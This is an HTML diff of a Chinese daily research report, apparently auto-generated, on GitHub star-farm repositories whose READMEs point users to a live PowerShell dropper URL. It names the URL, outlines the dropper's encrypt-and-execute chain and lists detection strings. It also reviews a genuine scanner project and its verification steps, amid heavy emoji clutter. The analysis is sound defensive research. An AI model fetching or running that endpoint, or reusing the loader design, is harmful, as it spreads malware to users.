+<td><strong>AES-256-CBC + PKCS7</strong>，key 来自载荷头 32 字节，IV 来自载荷头 16 字节</td>
+</tr>
+<tr>
+<td>解压</td>
+<td>按首字节选择 <strong>GZip</strong> 或 <strong>Deflate</strong>，并限制解压后 ≤ <strong>64 MiB</strong></td>
+</tr>
+<tr>
+<td>落地</td>
+<td><code>Parser::ParseInput</code> 做语法校验（有错则抛 <code>Invalid decoded PowerShell</code>），再 <code>GetScriptBlock()</code> 执行</td>
+</tr>
+<tr>
+<td>服务端</td>
+<td><code>https://git-software.cc/ps/Setup.ps1</code> 实测 <strong>HTTP 200</strong>，<code>Content-Length: 8899</code>，<code>Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.5.12</code>，<code>Last-Modified: 2026-10-28T21:44:47Z</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐ 而服务端响应头本身也是一条信息：<code>X-Powered-By: PHP/8.5.12</code> + Apache/2.4.58 (Win64) —— 即</strong>这是一个由 Windows 服务器上的 PHP 动态站提供的分发端点<strong>，与 GitHub 仓库本身完全解耦。</strong> ⭐⭐⭐⭐ <strong>这意味着：即使 GitHub 删掉全部 88 个仓库，投放端点仍然在线 —— 而本日报已实测它今天返回 200。</strong></p>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐ 而本日报还发现了一条本日报此前未记录过的新机制 —— 仓库级的快速轮换：</strong></p>
+<p><strong>本日报在核验过程中，有 4 个此前 30 分钟内还在的仓库开始返回 404：<code>planewaspgrave/AIDA-64-Extreme</code>、<code>thresholdwolfshack/Autodesk-Inventor</code>、<code>StandardLouseChain/Cubase</code>（以及更早的 <code>CaveVerseNight/Adobe-InDesign</code> 一度失败后恢复）。</strong> 本日报已复核：<code>CaveVerseNight/Adobe-InDesign</code> 仍在线（248⭐），其余三个已 404，且从搜索索引中消失。<strong>⭐⭐⭐⭐⭐⭐ </strong>即：这套体系在<strong>被删除后立即重建并换名</strong>（本日报在同一批里见到 <code>planewaspgrave</code> → 已是 404，而 <code>planewaspgrave</code> 的另一个变体 <code>Planewaspgrave</code> 大小写不同的名字在 <code>search/repositories</code> 里仍能查到）。<strong> ⭐⭐⭐⭐ 这与「一次性刷星后弃用」的旧模式不同 —— 这是</strong>有运维能力的持续性投放基础设施<strong>。</strong></p>
+<p><strong>架构师速览（生态级投放模式的判定体系）：</strong></p>
+<table>
+<thead>
+<tr>
+<th>决策问题</th>
+<th>研究判断</th>
+<th>证据边界</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>系统边界</td>
+<td>本日关注的不是单个系统，而是<strong>「一个仓库是否值得被信任」这一判断系统</strong>的四层：① <strong>内容层</strong>（README 是否含可执行指令、是否指示关闭防护、是否含伪装成搜索词的 SEO 段落）② <strong>结构层</strong>（文件数/体积/owner 名/创建时间窗/是否共享 blob SHA）③ <strong>可执行层</strong>（被指向的端点是否仍可达、其响应头与载荷外壳是什么）④ <strong>生命周期层</strong>（仓库是否在核验窗口内被删除重建、搜索索引是否同步消失）。<strong>⭐⭐⭐ 本日新增的是第 ③ 层与第 ④ 层 —— 此前所有判据都停在「这个仓库像不像农场」，本日第一次能回答「它指向的东西现在还活着吗」</strong></td>
+<td>100 个仓库的 README 原文（经 <code>contents/{path}</code> + raw 头抓取）、206/180 两个分母（Search API）、投放脚本的静态文本分析、HTTP 响应头、4 个 404 观测。<strong>⭐⭐ 内容层的分类判断是本日报的人工判断；本日报未执行任何被投放的代码，也未解密其载荷，因此</strong>不能断言其最终行为**</td>
+</tr>
+<tr>
+<td>主路径</td>
+<td>对每个候选依次：① <code>repos/{o}/{r}</code> 读计数与时间戳 → ② <code>git/trees/HEAD</code> 看文件构成 → ③ <strong>抓 <code>contents/README.md</code> 原文并检索可执行指令模式</strong>（<strong>本日报今日新增的核心一步</strong>）→ ④ 对命中项抓取该指令指向的 URL，做 <strong>HEAD/静态获取</strong>（<strong>不执行</strong>）→ ⑤ 记录 HTTP 状态、Server/X-Powered-By、Content-Length、Last-Modified → ⑥ 静态分析载荷外壳（base64 / HMAC / AES / 压缩 / 语法校验），<strong>不解密不执行</strong> → ⑦ 用 <code>search/repositories</code> 给分母 → ⑧ <strong>在核验窗口末段复查仓库是否仍在线</strong>（<strong>本日报今日新增的第四步</strong>）→ ⑨ 用 <code>subscribers_count</code> / <code>commits</code> / <code>releases</code> / <code>contributors</code> 判「真实产出」</td>
+<td>上述 9 步的 API 调用与其返回。<strong>⭐⭐⭐ 本日报的核验边界必须写清楚：本日报的「88/100」是</strong>按 star 降序的前 100 个<strong>上的比例，不是全量普查；Search API 给出的 180 个 <code>size&lt;=20KB</code> 仓库中，本日报</strong>未逐个<strong>核验投放指令</strong></td>
+</tr>
+<tr>
+<td>关键权衡</td>
+<td><strong>⭐⭐⭐ 抓取原文 vs 只看元数据</strong>（此前几天的判据全部止于元数据；本日第一次必须看内容才能发现投放）· <strong>⭐⭐⭐ 静态分析 vs 执行</strong>（本日报下载但未执行，代价是<strong>无法断言最终行为</strong>，收益是<strong>不制造危害</strong>）· <strong>⭐⭐⭐ 抽样 vs 全量</strong>（本日报取 100 个，比例 88%；<strong>但今日的策略是「先按 star 降序取样」，这会</strong>高估<strong>或</strong>低估<strong>总体比例，取决于投放者是否也让高星仓库携带指令 —— 本日报今日的取样里既有 297⭐ 也有 238⭐ 的命中样本，</strong>因此本日报无法排除样本偏差<strong>）· </strong>⭐⭐ 删除重建 vs 一次性弃用<strong>（</strong>本日观测到 4 个仓库在核验窗口内 404，即这套体系在被清理后重建<strong>）· </strong>⭐⭐⭐ 端点存活 vs 仓库存活<strong>（</strong>即使 GitHub 全部下架，端点仍实测 200<strong> —— 这是本日报今日对「打掉农场」这一处置方式有效性的直接质疑）· </strong>⭐ 显式命名 vs 匿名分发<strong>（本日报</strong>记录但不执行**）</td>
+<td>全部快照数据与原文。<strong>⭐⭐ 未核验：本日报未核验 <code>git-software.cc</code> 域名的注册信息、未核验其是否有其他分发路径、未核验 GitHub 平台侧是否已收到报告、未核验其余 80 个 <code>size&lt;=20KB</code> 仓库是否也携带该指令。⭐⭐⭐ 本日报</strong>不提供<strong>「这些 star 全部是假的」这类估计值 —— </strong>本日报只能核验「这些仓库携带同一条投放指令且指向一个活跃端点」这一事实**</td>
+</tr>
+<tr>
+<td>最小 PoC</td>
+<td>1. <strong>⭐⭐⭐ 抓 README 原文并检索 <code>irm http</code> / <code>Invoke-Expression</code> / <code>ExecutionPolicy Bypass</code> / 「pause real-time protection」</strong>（<strong>本日报今日新增、成本最低、命中最高的一步</strong>）→ 2. <strong>⭐⭐⭐ 用 <code>search/repositories</code> 按 <code>created:</code> + <code>size:&lt;=N</code> 给分母</strong>（本日报今日：206 → 180）→ 3. <strong>⭐⭐ 对命中项只做 HEAD / 静态获取，不执行</strong>→ 4. <strong>⭐⭐ 记录响应头与 Last-Modified</strong>（本日报今日：<code>Apache/2.4.58 (Win64) … PHP/8.5.12</code>）→ 5. <strong>⭐⭐ 静态读载荷外壳的机制链</strong>（base64 → HMAC → AES-CBC → 压缩 → 语法校验）—— <strong>本日报今日靠这一步确认它是「加密的投放器」而不是普通安装脚本</strong>→ 6. <strong>⭐⭐⭐ 在核验窗口末段复查仓库是否仍在线</strong>（<strong>本日报今日靠这一步发现 4 个 404</strong>）→ 7. <strong>⭐ 用 <code>subscribers_count</code> / <code>commits</code> / <code>releases</code> 判真实产出（</strong>今日 <code>interplains/Zero-Breach-Toolkit</code> subs 33 vs 农场 subs 0，可作对照<strong>）→ 8. </strong>⭐ 最后才看 star**</td>
+<td><strong>第 1 步是本日报今日的核心贡献，且它不依赖任何付费或受限接口</strong> · <strong>第 5 步能区分「加密投放器」与「普通脚本」，但</strong>不能<strong>判定最终行为</strong> · <strong>第 6 步是本日报今日新增的、用来识别「持续性投放」的一步</strong> · <strong>本方法不覆盖</strong>「不带投放指令、只做 SEO 投毒的农场」—— <strong>这类仓库本日报的方法查不出来，因为它没有可检索的固定字符串</strong></td>
+</tr>
+</tbody>
+</table>
+<h3 id="3-91">趋势 3：与农场同框的三个真项目，都把「结论交给可复算的东西」（趋势分 91）</h3>
+<p><strong>⭐⭐⭐ 本日最值得记的方法论观察是：在这份 100 个仓库的取样里，农场与真项目混在同一份 star 榜单里，而</strong>区分它们的不是 star，是「它是否把自己的结论交给一个别人能独立重跑的东西来裁决」。**</p>
+<h4 id="interplainszero-breach-toolkit3543-381-subs-33-55-commits-14-release-apache-20-1113-kb">⭐⭐ <code>interplains/Zero-Breach-Toolkit</code>（3,543⭐ ⑂381 · <strong>subs 33</strong> · 55 commits · <strong>14 个 release</strong> · Apache-2.0 · 1,113 KB）</h4>
+<p><strong>⭐⭐⭐⭐ 它最硬的一处，是把「我的扫描器干净」与「你安全」这两件事</strong>明确切开<strong>—— 而且是用三个并列的句子切开的：</strong></p>
+<blockquote>
+<ul>
+<li><strong>Read-only.</strong> It does not modify source evidence or system settings. It writes only temporary database snapshots and the reports you ask for.</li>
+<li><strong>No network requests during a scan.</strong> It never looks up spyware addresses and has no upload feature. Python network calls are blocked and redirected paths are refused. <strong>This is not an operating-system network sandbox</strong>; see <a href="PRIVACY.md">PRIVACY.md</a>.</li>
+<li><strong>States its limits.</strong> Every report says what was found, how strong the evidence is, and what could not be checked. <strong>A clean result is never presented as proof that you are safe.</strong></li>
+</ul>
+</blockquote>
+<p><strong>⭐⭐⭐⭐⭐ 而 <code>PRIVACY.md</code> 里那句自我设限是本日报今日见过最诚实的一处技术声明：</strong></p>
+<blockquote>
+<p><strong>These guards are not an operating-system network sandbox: POSIX network mounts and concurrent filesystem changes remain limitations. Use operating-system network isolation when strict offline execution is required.</strong></p>
+</blockquote>
+<p><strong>⭐⭐⭐⭐⭐⭐ 即：它明说「我的『无网络』保证有已知的逃逸口，请用操作系统级隔离来补」。</strong> <strong>⭐⭐⭐⭐ 这与本日报 10-28 记录的 nyxis「a passing integration test is never a substitute for a formal proof」是同一条纪律的两种形态 —— </strong>两者都在说「我的保证有边界，边界我写下来了」。**</p>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐⭐ 而它的验证路径是本日报今日最值得抄的一份文档 —— <code>docs/VERIFYING.md</code> 给出</strong>两条互相独立的验证<strong>，并明确要求「Use both」：</strong></p>
+<p><strong>① 签名验证</strong>（对照一个你已经信任的密钥）：
+<code>gpg --show-keys --with-fingerprint archivegenocide-signing-key.asc
+gpg --import archivegenocide-signing-key.asc
+gpg --verify SHA256SUMS.txt.asc SHA256SUMS.txt
+sha256sum -c SHA256SUMS.txt</code>
+完整指纹写死为 <code>C24E C92B 12D6 670A 2516 065F 9B4D 5754 99AF A53C</code>，并附「compare that fingerprint with [ArchiveGenocide's verification page] or another record you already trust」，还明写「<strong>Never ignore a fingerprint mismatch or a failed verification.</strong>」。</p>
+<p><strong>② 自行复现构建</strong>（不依赖发布者）：
+<code>git checkout v0.1.13
+python build/bundle.py
+sha256sum dist/zero-breach-toolkit.py</code>
+原文：「<strong>The build is deterministic, so a mismatch means something is wrong, not merely different.</strong>」以及「Running from source is the other half of the same idea: <strong>nothing is compiled, and every line the tool executes can be read in the clone.</strong>」</p>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐ 而这份文档里最反直觉、也最值得单独抄走的一段，是「为什么没有代码签名」：</strong></p>
+<blockquote>
+<p><strong>Why there is no code signature</strong>
+There is no signed Windows release, and none is planned while the project stays anonymous. Code-signing certificates require a verifiable legal identity, and every signing route, including <a href="https://signpath.org/">SignPath Foundation</a>, expects named, publicly identified maintainers and approvers. <strong>This project does not have them, by choice. It claims no certificate, signing service or signed binary, and asks nobody to trust a downloaded signature.</strong></p>
+</blockquote>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐ 即：它没有签名二进制，于是它给的是</strong>另一条路<strong>（可复现构建 + 分离签名 + 指纹对照 + 「从源码运行时没有编译，每一行都能在 clone 里读」），并且</strong>明确说明「我们没有代码签名」这个缺口，而不是留白或假装有。<strong> </strong>⭐⭐ 本日报认为这是本日报见过最完整的一次「在受限条件下仍把验证路径做到可复算」的处理。**</p>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐ 而 14 天 14 个 release 的 changelog 写法，是本日报今日判断「这是真实工程」的第二条独立证据 —— 每个 release 记的是</strong>上一版在真实用户报告里暴露了哪个假阳性<strong>：</strong></p>
+<table>
+<thead>
+<tr>
+<th>release</th>
+<th>changelog 记的实际缺陷（原文摘录）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>v0.1.10</td>
+<td>「<strong>no false Safari gap for an app's own history.db</strong>, Amcache problems no longer reported under P…」</td>
+</tr>
+<tr>
+<td>v0.1.12</td>
+<td>「a 512 GB phone with a large photo library has a <code>Manifest.db</code> over 300 MB and an <code>Info.plist</code> over 16 MiB, which were <strong>over the check's limits, so the report said \"exceeds the read limit\" and nothing on the phone was checked</strong>」→ 上限提到 1 GiB/文件、1,000,000 manifest 行、8 GiB 总量、64 MiB 属性列表</td>
+</tr>
+<tr>
+<td>v0.1.13</td>
+<td>「<strong>so a gap no longer says impossible things like \"3 of 1 candidate file(s)\"</strong>」（来自外部 PR #19）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐ 即：</strong>「3 of 1 candidate file(s)」这种自相矛盾的报错被一个外部贡献者指出并修掉了<strong> —— 这正是本日报连续多日记录的「最强采用信号」的形态：提 issue 的人必须先跑起来。</strong> 且 <code>#17</code>（Linux 安装说明）与 <code>#16</code>（Windows Outlook WebView 上的良性命中被报成威胁）也都被接收并修复。**</p>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐ 而 <code>SECURITY.md</code> 里最值得记的一处，是它把「干净不是保证」写进了「什么不算漏洞」一节：</strong></p>
+<blockquote>
+<p><strong>Not a vulnerability</strong> — <strong>A clean result is not a guarantee.</strong> The tool says so itself. Spyware of this grade is built to defeat retrospective checks; missing a real infection is a documented limitation, not a bug.</p>
+</blockquote>
+<p><strong>⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐ 即：它预先声明「漏检是文档化的限制，不是 bug」—— 而这份声明</strong>降低了用户对它的信任度<strong>，却</strong>提高了结论的可信度<strong>。</strong></p>
+    </div>
+</main>
+    <footer class="footer">
+        <p><strong>AIUtil 产品</strong> · 研究内容由定时任务生成，结论以原始来源为准。</p>
+        <p style="margin-top:8px;"><a href="https://aiutil.com">AIUtil</a> · <a href="https://aiutil.com/about">关于</a> · <a href="https://agentos.aiutil.com">Agent OS</a> · <a href="https://radar.aiutil.com">前沿论文</a> · <a href="https://github-research.aiutil.com">GitHub 趋势</a> · <a href="https://nimbus.aiutil.com">Nimbus</a> · <a href="https://visionai.aiutil.com">VisionAI</a> · <a href="https://github.com/aiutil/github-researcher">源码</a></p>
+    </footer>
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+    <script>mermaid.initialize({startOnLoad:true,theme:'neutral',securityLevel:'loose'});</script>
+</body>
+</html>
